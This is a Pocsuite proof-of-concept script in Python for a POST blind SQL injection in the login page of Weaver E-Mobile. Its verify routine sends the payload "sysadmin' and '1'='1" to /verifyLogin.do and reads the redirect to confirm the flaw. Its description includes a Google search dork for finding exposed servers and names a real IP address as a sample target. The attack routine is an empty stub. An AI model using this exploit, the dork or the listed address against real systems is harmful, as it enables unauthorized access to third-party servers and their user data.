#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import urlparse


import json


class TestPOC(POCBase):
    vulID = '123635'
    version = '1.0'
    author = ["kikay"]
    vulDate = '	2015-07-03'
    createDate = '2018-12-27'
    updateDate = '2018-12-27'
    references = ["https://bugs.shuimugan.com/bug/view?bug_no=123635"]
    name = "泛微E-Mobile Java版本 登录框存在POST盲注"
    appPowerLink = 'https://www.weaver.com.cn/'
    appName = '泛微E-mobile'
    appVersion = 'UnKnown'
    vulType = 'SQl Injection'
    desc = '''
    问题出在 e-cology的移动端,一般端口为89,登录框存在POST盲注
    谷歌搜索 allintext: 用户名: 密码: 记住密码. 自动登录. E-Mobile
    '''
    samples = ["http://61.132.29.219:89"]
    install_requires = ['']
    search_keyword = "The URL has moved"


    def _attack(self):
        result = {}
        #Write your code here

        return self.parse_output(result)

    def _verify(self):
        result = {}
        # Write your code here
        self.raw_url = self.url
        host = urlparse.urlparse(self.url).hostname
        port = urlparse.urlparse(self.url).port
        scheme = urlparse.urlparse(self.url).scheme
        if port is None:
            self.url = "%s://%s" % (scheme, host)
        else:
            self.url = "%s://%s:%s" % (scheme, host, port)

        vulurl=('{url}/verifyLogin.do').format(url=self.url)
        username = "sysadmin' and '1'='1"
        data = {
            'loginid': username,
            'password': '1'
        }

        try:
            res = req.post(url=vulurl, data=data, timeout=(10, 15), verify=False, allow_redirects=False)
            if res.status_code == 302 and 'message=102' in res.headers.get("Location"):
                result["VerifyInfo"] = {}
                result["VerifyInfo"]["URL"] = vulurl
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if len(result.keys()) != 0:
            json_result = {
                "result": {"json": json.dumps(result)}
            }
            output.success(json_result)
        else:
            output.fail('Internet nothing returned')
        return  output


register(TestPOC)